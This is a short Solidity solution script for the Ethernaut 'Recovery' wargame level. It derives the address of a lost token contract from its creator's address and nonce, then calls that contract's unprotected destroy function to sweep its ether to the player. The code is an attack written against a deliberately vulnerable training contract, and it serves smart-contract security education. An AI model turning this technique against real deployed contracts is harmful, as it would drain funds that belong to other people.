// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {Recovery, SimpleToken} from "ethernaut/levels/Recovery.sol";

contract Check is CheckScript("RECOVERY") {}

contract Solve is SolveScript("RECOVERY") {
    Recovery target;

    constructor() {
        target = Recovery(instance);
    }

    function attack() public override {
        // find the SimpleToken address
        bytes32 rlp = keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), address(target), uint8(0x01)));
        address addr = address(uint160(uint256(rlp)));

        // recover the tokens
        SimpleToken(payable(addr)).destroy(payable(player));
    }
}
